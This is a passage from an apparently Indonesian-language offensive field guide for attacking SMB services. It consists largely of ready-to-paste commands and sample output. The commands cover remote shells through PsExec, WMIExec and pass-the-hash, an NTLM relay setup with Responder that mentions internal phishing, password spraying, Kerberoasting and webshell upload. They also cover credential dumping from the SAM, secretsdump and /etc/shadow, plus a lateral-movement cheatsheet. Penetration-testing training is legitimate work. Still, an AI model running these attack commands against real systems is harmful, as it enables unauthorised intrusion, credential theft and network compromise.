➡️ Ke **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)** untuk full SSH workflow.

---

### PATH D — PsExec / WMIExec (Jika dapat Admin Credentials)

Bash

```
# Method 1: PsExec (paling reliable, tapi noisy - buat SYSTEM shell)
impacket-psexec "$USER:$PASS@$TARGET"

# Method 2: WMIExec (lebih stealth, tidak buat service)
impacket-wmiexec "$USER:$PASS@$TARGET"

# Method 3: SMBExec (stealth, tidak upload binary)
impacket-smbexec "$USER:$PASS@$TARGET"

# Method 4: Pass-The-Hash versions
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
impacket-wmiexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
```

**OUTPUT BERHASIL ✅ — PsExec:**

text

```
[*] Requesting shares on 10.10.11.200.....
[*] Found writable share ADMIN$
[*] Uploading payload...
[*] Created \pwned.exe service
Microsoft Windows [Version 10.0.17763.2628]
C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — PsExec: Access Denied:**

text

```
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

➡️ User bukan local admin. Coba WMIExec atau cek privilege:

Bash

```
nxc smb $TARGET -u "$USER" -p "$PASS" --local-auth
# Jika (Pwn3d!) → user adalah local admin tapi mungkin UAC blocking
# Coba: impacket-wmiexec -nooutput atau via winrm
```

---

## ═══════════════════════════════════════

## FASE 8: NTLM RELAY ATTACK

## ═══════════════════════════════════════

> Prasyarat: SMB Signing = disabled/not required (dari Langkah 0.2)

Bash

```
# LANGKAH 8.1: Buat target list untuk relay
# Scan network untuk host dengan signing disabled
nxc smb 10.10.11.0/24 --gen-relay-list relay_targets.txt

# LANGKAH 8.2: Setup ntlmrelayx di terminal 1
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -l loot

# LANGKAH 8.3: Setup Responder di terminal 2 (matikan SMB dan HTTP di Responder)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I tun0 -rdwv

# LANGKAH 8.4: Tunggu authentication event dari network
# (atau trigger dengan link injection di web app, email phishing internal, dll)
```

**OUTPUT BERHASIL ✅ — Hash di-relay:**

text

```
[*] SMBD-Thread-4: Received connection from 10.10.11.50
[*] Authenticating against smb://10.10.11.200 as CORP\svc_backup SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target: 10.10.11.200
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
```

---

## ═══════════════════════════════════════

## FASE 9: POST-EXPLOITATION & PIVOT HINTS

## ═══════════════════════════════════════

### Setelah Dapat Shell — Kumpulkan Informasi untuk Lateral Movement

Bash

```
# Di Windows shell:
# 1. Dump credentials lokal
C:\> reg save HKLM\SAM sam.bak
C:\> reg save HKLM\SYSTEM system.bak
# Download lalu:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# 2. Cek network untuk target berikutnya
C:\> ipconfig /all
C:\> net view /domain
C:\> arp -a

# 3. Cek share yang bisa diakses dari dalam
C:\> net use \\DC01\C$ /user:Administrator Password123!
C:\> net view \\DC01\

# Di Linux shell:
# 1. Cari credentials lain
cat /etc/passwd
cat /etc/shadow   # butuh root
find / -name "*.conf" -readable 2>/dev/null | xargs grep -i password 2>/dev/null

# 2. Cek koneksi aktif (target pivot berikutnya)
ss -tunp
netstat -tunp
arp -n
```

### Cross-Service Credential Testing Chart

Setiap kali dapat credentials dari SMB, test ke service ini:

text

```
SMB Creds Found
     │
     ├─ ─→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a></a>
     ├──→ Port 21  (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a></a>
     ├──→ Port 25  (SMTP)    → <a href="/docs/smtp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/smtp" class="text-[#00b4d8] hover:underline font-mono font-semibold">08_smtp_workflow.md</a></a>
     ├──→ Port 389 (LDAP)    → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a></a>
     ├──→ Port 3389 (RDP)    → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a></a>
     ├──→ Port 5985 (WinRM)  → evil-winrm
     ├──→ Port 1433 (MSSQL)  → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a></a>
     ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a></a>
     └──→ AD Environment     → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a></a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`NT_STATUS_ACCESS_DENIED`|Anonymous diblokir|Coba `guest`, `nobody`, atau beralih ke RPC|
|`NT_STATUS_LOGON_FAILURE`|Username/pass salah|Cek `--local-auth`, cek domain vs local|
|`NT_STATUS_CONNECTION_REFUSED`|Port 445 diblokir|Coba port 139, tambah `-Pn` di nmap|
|`NT_STATUS_INVALID_NETWORK_RESPONSE`|SMBv1 needed|`smbclient --option='client min protocol=NT1'`|
|`NT_STATUS_BAD_NETWORK_NAME`|Share name salah|`smbmap -H $TARGET` untuk list yang benar|
|`NT_STATUS_ACCOUNT_LOCKED_OUT`|Terlalu banyak spray|STOP! Tunggu lockout duration, cek `getdompwinfo`|
|`NT_STATUS_PASSWORD_MUST_CHANGE`|First login force change|`smbpasswd -r $TARGET -U username`|
|`Connection timeout`|Firewall|`nmap -Pn -sS -p 445 --source-port 53 $TARGET`|
|`SPNEGO/Kerberos error`|FQDN tidak resolve|`echo "$TARGET domain.local hostname" >> /etc/hosts`|
|`signing:True relay blocked`|SMB Signing required|Crack hash offline: `hashcat -m 5600 hash.txt rockyou.txt`|
|Exploit crash / no session|Target tidak stabil|Coba WMIExec atau SMBExec sebagai alternatif PsExec|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 445/139 Open
│
├─ FASE 0: Fingerprint
│   ├─ TTL ~128 → Windows
│   ├─ TTL ~64  → Linux Samba
│   └─ nxc smb → OS, Signing status, SMBv1
│
├─ FASE 1: Anonymous Check
│   ├─ [Share accessible] → FASE 2 (Looting)
│   └─ [All denied]       → FASE 3 (RPC) → FASE 4 (Vuln Scan)
│
├─ FASE 2: File Looting
│   ├─ [Password ditemukan]   → FASE 6 (Authenticated Enum)
│   ├─ [SSH key ditemukan]    → Crack passphrase → SSH
│   ├─ [Writable = web root]  → Upload webshell → SHELL
│   └─ [Tidak ada sensitif]   → FASE 3
│
├─ FASE 3: RPC Enumeration
│   └─ [User list]         → FASE 5 (Password Spray)
│
├─ FASE 4: Vulnerability Scan
│   ├─ [MS17-010 VULN]     → PATH A (EternalBlue → SYSTEM)
│   ├─ [SambaCry VULN]     → PATH B (SambaCry → ROOT)
│   └─ [Not vulnerable]    → FASE 5
│
├─ FASE 5: Password Spray
│   ├─ [(Pwn3d!) Admin]    → PATH D (PsExec/WMIExec → SYSTEM)
│   └─ [Standard user]     → FASE 6
│
├─ FASE 6: Authenticated Enum
│   ├─ [More shares found] → Loot more
│   ├─ [Kerberoast hash]   → Crack → AD pivot
│   └─ [NTLM hash]         → PTH → Lateral movement
│
└─ FASE 7-9: Exploitation & Post-Exploitation
    └─ [Shell obtained] → Collect info → Pivot ke target lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"
export USER=""; export PASS=""; export DOMAIN="CORP.LOCAL"
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
mkdir -p ~/smb_loot/{files,creds,keys}

# === RECON ===
nxc smb $TARGET                                          # OS + Signing check
nmap -sV -p 139,445 --script smb-os-discovery $TARGET   # Detailed fingerprint

# === ANONYMOUS ENUM ===
smbclient -N -L //$TARGET/                              # List shares
smbmap -H $TARGET                                        # Permission check
nxc smb $TARGET -u '' -p '' --shares                   # NetExec anon
nxc smb $TARGET -u 'guest' -p '' --shares              # Guest check

# === LOOTING ===
smbclient -N //$TARGET/SHARENAME -c 'recurse ON; prompt OFF; mget *'
smbmap -H $TARGET -u 'guest' -p '' -R SHARE --download '.*'

# === RPC ENUM ===
rpcclient -U "" -N $TARGET -c "enumdomusers;querydispinfo;quit"
nxc smb $TARGET -u '' -p '' --rid-brute 10000 | grep SidTypeUser

# === VULN SCAN ===
nmap -p 139,445 --script "smb-vuln-*" --script-args unsafe=1 $TARGET

# === SPRAY ===
nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success

# === SHELL ===
evil-winrm -i $TARGET -u "$USER" -p "$PASS"            # WinRM
impacket-psexec "$USER:$PASS@$TARGET"                   # PsExec (SYSTEM)
impacket-wmiexec "$USER:$PASS@$TARGET"                  # WMIExec (stealth)
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"  # PTH

# === POST EXPLOIT ===
impacket-secretsdump "$USER:$PASS@$TARGET"              # Dump hashes
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $TARGET -request  # Kerberoast
```

---

> **➡️ NEXT:** Setelah SMB selesai dan dapat credentials, lanjut ke **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)** untuk handle SSH keys, bypass algoritma legacy, dan port forwarding untuk pivot ke jaringan internal.
